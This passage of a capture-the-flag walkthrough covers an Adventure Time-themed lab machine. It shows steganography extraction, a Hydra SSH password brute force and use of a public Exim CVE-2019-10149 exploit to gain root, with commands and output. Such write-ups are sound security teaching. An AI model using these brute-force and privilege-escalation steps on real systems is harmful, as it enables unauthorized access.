&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc 10.10.237.150 &lt;span class="m">31337&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hello Princess Bubblegum. What is the magic word?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ApplePie
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The password of peppermint-butler is: That Black Magic
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So now we can switch user and retrieve the flag:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">su peppermint-butler
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password:
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We can see a picture in the home directory.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">find / -type f -user peppermint-butler 2&amp;gt;/dev/null | head
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/share/xml/steg.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/etc/php/zip.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/proc/1779/task/1779/fdinfo/0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/proc/1779/task/1779/fdinfo/1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/proc/1779/task/1779/fdinfo/2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/proc/1779/task/1779/fdinfo/255
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/proc/1779/task/1779/environ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/proc/1779/task/1779/auxv
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/proc/1779/task/1779/status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/proc/1779/task/1779/personality
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">peppermint-butler@at:~$ cat /usr/share/xml/steg.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">I need to keep my secrets safe.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">There are people in this castle who can&amp;#39;t be trusted.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Those banana guards are not the smartest of guards.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">And that Marceline is a friend of princess Bubblegum,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">but I don&amp;#39;t trust her.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">So I need to keep this safe.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The password of my secret file is &amp;#39;ToKeepASecretSafe&amp;#39;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">peppermint-butler@at:~$ cat /etc/php/zip.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">I need to keep my secrets safe.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">There are people in this castle who can&amp;#39;t be trusted.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Those banana guards are not the smartest of guards.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">And that Marceline is a friend of princess Bubblegum,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">but I don&amp;#39;t trust her.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">So I need to keep this safe.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The password of my secret file is &amp;#39;ThisIsReallySave&amp;#39;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Using “ToKeepASecretSafe” as a password, we are able to find a zip file in the image:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">steghide extract -sf butler-1.jpg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Enter passphrase:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wrote extracted data to &amp;#34;secrets.zip&amp;#34;.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>The zip is protected by a password, and we can unzip it using the other password “ThisIsReallySave”:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">unzip secrets.zip
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat secrets.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[0200 hours][upper stairs]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">I was looking for my arch nemesis Peace Master,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">but instead I saw that cowering little puppet from the Ice King.....gunter.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">What was he up to, I don&amp;#39;t know.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">But I saw him sneaking in the secret lab of Princess Bubblegum.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">To be able to see what he was doing I used my spell &amp;#39;the evil eye&amp;#39; and saw him.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">He was hacking the secret laptop with something small like a duck of rubber.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">I had to look closely, but I think I saw him type in something.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">It was unclear, but it was something like &amp;#39;The Ice King s????&amp;#39;.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The last 4 letters where a blur.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Should I tell princess Bubblegum or see how this all plays out?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">I don&amp;#39;t know.......
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So now we know that the password starts with The Ice King s and has other 4 characters.&lt;/p>
&lt;p>I used https://scrabblewordfinder.org/5-letter-words-starting-with/s to built a text file of possible that I’ll use with hydra.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">hydra -l gunter -P passwords_gunter.txt ssh://10.10.237.150
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-07 17:39:09
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[DATA] max 16 tasks per 1 server, overall 16 tasks, 1564 login tries (l:1/p:1564), ~98 tries per task
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[DATA] attacking ssh://10.10.237.150:22/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[STATUS] 181.00 tries/min, 181 tries in 00:01h, 1388 to do in 00:08h, 16 active
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[STATUS] 124.00 tries/min, 372 tries in 00:03h, 1197 to do in 00:10h, 16 active
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[STATUS] 117.57 tries/min, 823 tries in 00:07h, 748 to do in 00:07h, 16 active
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[STATUS] 115.25 tries/min, 1383 tries in 00:12h, 188 to do in 00:02h, 16 active
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[22][ssh] host: 10.10.237.150 login: gunter password: The Ice King sucks
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1 of 1 target successfully completed, 1 valid password found
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[WARNING] Writing restore file because 7 final worker threads did not complete until end.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[ERROR] 7 targets did not resolve or could not be connected
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[ERROR] 0 targets did not complete
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-07 17:51:33
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So, now we can go to the gunter home and retrieve the flag.&lt;/p>
&lt;p>Now I am going to search for root SUIDs:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">find / -user root -perm -u=s 2&amp;gt;/dev/null
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/sbin/pppd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/sbin/exim4
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/lib/eject/dmcrypt-get-device
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/lib/openssh/ssh-keysign
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/lib/policykit-1/polkit-agent-helper-1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/lib/xorg/Xorg.wrap
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/lib/dbus-1.0/dbus-daemon-launch-helper
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/chfn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/pkexec
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/chsh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/arping
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/gpasswd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/newgrp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/passwd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/traceroute6.iputils
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/vmware-user-suid-wrapper
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/sudo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/ping
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/umount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/su
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/fusermount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/mount
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Exim is a strange file.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">exim4&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="n">version&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Exim&lt;/span> &lt;span class="n">version&lt;/span> &lt;span class="mf">4.90&lt;/span>&lt;span class="n">_1&lt;/span> &lt;span class="c1">#4 built 14-Feb-2018 16:01:14&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Copyright&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">University&lt;/span> &lt;span class="n">of&lt;/span> &lt;span class="n">Cambridge&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1995&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">2017&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">The&lt;/span> &lt;span class="n">Exim&lt;/span> &lt;span class="n">Maintainers&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">contributors&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">ACKNOWLEDGMENTS&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2007&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">2017&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Berkeley&lt;/span> &lt;span class="n">DB&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Berkeley&lt;/span> &lt;span class="n">DB&lt;/span> &lt;span class="mf">5.3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">September&lt;/span> &lt;span class="mi">9&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2013&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Support&lt;/span> &lt;span class="k">for&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">crypteq&lt;/span> &lt;span class="n">iconv&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="n">IPv6&lt;/span> &lt;span class="n">GnuTLS&lt;/span> &lt;span class="n">move_frozen_messages&lt;/span> &lt;span class="n">DKIM&lt;/span> &lt;span class="n">DNSSEC&lt;/span> &lt;span class="n">Event&lt;/span> &lt;span class="n">OCSP&lt;/span> &lt;span class="n">PRDR&lt;/span> &lt;span class="n">SOCKS&lt;/span> &lt;span class="n">TCP_Fast_Open&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Lookups&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">built&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="ow">in&lt;/span>&lt;span class="p">):&lt;/span> &lt;span class="n">lsearch&lt;/span> &lt;span class="n">wildlsearch&lt;/span> &lt;span class="n">nwildlsearch&lt;/span> &lt;span class="n">iplsearch&lt;/span> &lt;span class="n">cdb&lt;/span> &lt;span class="n">dbm&lt;/span> &lt;span class="n">dbmjz&lt;/span> &lt;span class="n">dbmnz&lt;/span> &lt;span class="n">dnsdb&lt;/span> &lt;span class="n">dsearch&lt;/span> &lt;span class="n">nis&lt;/span> &lt;span class="n">nis0&lt;/span> &lt;span class="n">passwd&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Authenticators&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">cram_md5&lt;/span> &lt;span class="n">plaintext&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Routers&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">accept&lt;/span> &lt;span class="n">dnslookup&lt;/span> &lt;span class="n">ipliteral&lt;/span> &lt;span class="n">manualroute&lt;/span> &lt;span class="n">queryprogram&lt;/span> &lt;span class="n">redirect&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Transports&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">appendfile&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">maildir&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">mailstore&lt;/span> &lt;span class="n">autoreply&lt;/span> &lt;span class="n">lmtp&lt;/span> &lt;span class="n">pipe&lt;/span> &lt;span class="n">smtp&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Fixed&lt;/span> &lt;span class="n">never_users&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Configure&lt;/span> &lt;span class="n">owner&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Size&lt;/span> &lt;span class="n">of&lt;/span> &lt;span class="n">off_t&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Configuration&lt;/span> &lt;span class="n">file&lt;/span> &lt;span class="n">is&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">lib&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">exim4&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">autogenerated&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I found this exploit: https://raw.githubusercontent.com/AzizMea/CVE-2019-10149-privilege-escalation/master/wizard.py &lt;/p>
&lt;p>we can copy the script, change the port to the one that exim4 is running and execute it.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">python wizard.py
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">220 at ESMTP Exim 4.90_1 Ubuntu Sun, 07 Jun 2020 19:12:08 +0200
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">250 at Hello localhost [127.0.0.1]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">250 OK
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">250 Accepted
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">354 Enter message, ending with &amp;#34;.&amp;#34; on a line by itself
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">250 OK id=1jhyq8-0000r2-HW
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So now we just want to find the last flag, which is in the bubblegum home.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat bmo.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░▄██████████████████████▄░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░░░░░░░░░░░░░░░░░░░░░░█░░░░
